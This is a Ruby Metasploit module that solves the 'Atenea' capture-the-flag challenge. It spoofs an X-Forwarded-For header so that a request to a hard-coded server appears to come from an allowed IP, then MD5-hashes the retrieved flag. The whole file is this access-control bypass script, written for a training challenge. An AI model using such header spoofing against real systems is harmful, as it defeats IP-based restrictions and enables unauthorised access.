#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  require 'digest'  # MD5 Module

  def initialize
    super(
      'Name'        => 'Atenea: Solo para empleados Solver',
      'Description' => 'Get the flag using some X-Forwarding techniques and convert it in a valid flag using MD5 algorithm',
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('RHOSTS', 'THREADS')       # Scanner
    deregister_options('Proxies', 'VHOST', 'SSL') # HttpClient

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'ShowProgress',
      'ShowProgressPercent', 'WORKSPACE'
      ) 
    
    register_options([
      Opt::RHOST('85.159.210.133'),               # Override RHOST Option

      OptAddress.new('FORWARD', [false, 'IP address from which the return is made (ccn-cert.cni.es IP)', nil]),
      OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', nil])
    ], self.class)
  end

  # Scanner Module is necessary to execute run_host
  def run_host(ip)
    # Specifying the number of threads is necessary to run the scanner
    datastore['THREADS']   = 1

    datastore['FORWARD']   = '107.154.38.234' if datastore['FORWARD'] == ''
    datastore['TARGETURI'] = '/36e1889b/' if datastore['TARGETURI'].nil?

    begin
      # Connect to the server
      connect

      # Send a custom GET request to the server
      print_status('Sending GET request...')
      res = send_request_cgi({
        'uri'     => datastore['TARGETURI'],
        'method'  => 'GET',
        'headers' => {
          'X-Forwarded-For' => datastore['FORWARD']
        }
      })

      # Get the body of the request
      flag = res.get_html_document.to_s
      # Grep only the flag line
      flag = flag.scan(/flag.+/)[0]
      
      print_status("Detected #{flag}")

      # Format the flag according to the Athena's specifications
      flag = flag.sub(/flag:\ /, '').strip
      flag = Digest::MD5.hexdigest(flag)
      flag = "flag{#{flag}}"

      print_good("Solved: #{flag}")
    rescue
      print_error('Unhandled exception during execution')

    # ALWAYS disconnect the client
    ensure
      disconnect
    end
  end

end